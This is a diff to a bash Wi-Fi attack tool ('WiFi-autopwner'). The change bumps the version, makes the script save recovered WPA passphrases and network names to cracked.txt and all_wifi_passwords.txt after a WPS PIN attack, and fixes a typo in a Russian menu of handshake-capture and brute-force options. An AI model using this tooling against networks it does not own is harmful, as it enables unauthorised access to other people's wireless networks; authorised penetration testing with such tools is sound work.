@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Mi-Al/WiFi-autopwner 2
-VERS="20180812" # Happy-Birthday-Yong-release
+VERS="20180813" # Happy-Birthday-Yong-release
 
 IFACE=""
 REPLY=""
@@ -649,6 +649,9 @@ function showWPAPassFromPin {
 		sleep 60		
 		if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
 			echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
+			ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $7}')
+			echo "$ESSID" >> cracked.txt
+			echo "$ESSID:"`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'` >> all_wifi_passwords.txt
 		else
 			sudo airmon-ng check kill
 			sudo rm /var/run/wpa_supplicant/$IFACE
@@ -662,6 +665,9 @@ function showWPAPassFromPin {
 
 			if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
 				echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
+				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $7}')
+				echo "$ESSID" >> cracked.txt
+				echo "$ESSID:"`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'` >> all_wifi_passwords.txt
 			else
 				echo -e ${Lang[Strings36]}
 			fi
@@ -1192,7 +1198,7 @@ $INF
 	45. Атака с наиболее вероятными ПИНами на все ТД с WPS (требуется Интернет)
 5. WPA2/WPA
 	51. Захват рукопожатий всех Точек Доступа в округе
-	52. Захват рукопожатий всех Точек Доступа в округе + Брутфорсс
+	52. Захват рукопожатий всех Точек Доступа в округе + Брутфорс
 	53. Захват рукопожатия выбранной Точки Доступа
 	54. Захват рукопожатия выбранной Точки Доступа + Брутфорсс
 	55. Взлом последних захваченных рукопожатий (без захвата новых)
